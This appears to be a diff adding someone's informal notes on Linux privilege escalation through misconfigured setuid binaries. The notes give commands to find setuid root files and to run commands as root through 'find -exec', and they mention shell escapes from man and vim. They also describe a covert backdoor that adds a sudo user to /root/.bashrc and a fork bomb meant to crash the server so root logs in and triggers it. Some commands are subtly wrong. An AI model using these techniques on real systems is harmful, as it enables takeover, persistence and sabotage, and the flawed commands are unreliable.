@@ -1,0 +1,54 @@
+# One day I had to write it down, so here's an R&D for it
+
+-- RECON for misconfigured setuid files
+
+	$ find / -user root -perm -4000 -exec ls -ldb {} \;
+
+OR
+
+	$ find / -user root -perm -4000 -print 2>/dev/null
+
+-- THEN the road splits ... 
+
+===== EASY PEASY WAY: abuse exec options or interactive mode ===========
+
+  Use the binary in interactive mode or run with -exec options to privesc. A good example would be "find" with -exec option, another would be "python", etc. The point is to have the binary run commands as root, not any command, but rather commands we are most interested in.  
+
+Example with find (assuming "find" perm is set to 4755):
+$ ls -al
+-rwsr-xr-x 1 root  root   1337 Jul 2028 find 
+
+$ touch f
+$ find f -exec whoami \;
+root
+
+That's all to it, well, is it ? ;) There's also a BUFFER OVERFLOW..NOP NOP NOP hahahaa
+
+yep, NOP sled!!!
+
+===== BUFF OVERFLOW way to privesc or how Pros do IT! YEAH! =====
+
+
+
+
+
+
+
+NOTES/COOL STUFF:
+
+will be some cool/fun stuff here in this section, for now I just use it to procrastinate and write shit down, while thinking about the next step... 
+1. would be fun to have 4000 set to vi or vim and open sudoers file...just a thought
+2. man pages (or /usr/bin/man) escapes to a shell with '!', good to know... so does vi/vim :sh (exit to return)
+3. yet another smart way to add a user to sudo group inside /root/.bashrc, fork-nuke the server from shell as such: 
+$ :(){ :|: &};:   
+then wait for root to login and Wiola! got a user with sudo privs.
+assuming vi/vim is setuid vuln. Also don't forget to be more discreet as useradd produces output, redirect to /dev/null all the time.
+Example:
+$ vim/root/.bashrc
+Then, at the bottom, add:
+$ useradd -a -G sudo bla
+$ echo "bla:blapass" | chpasswd
+
+just don't forget the password ;)))
+
+
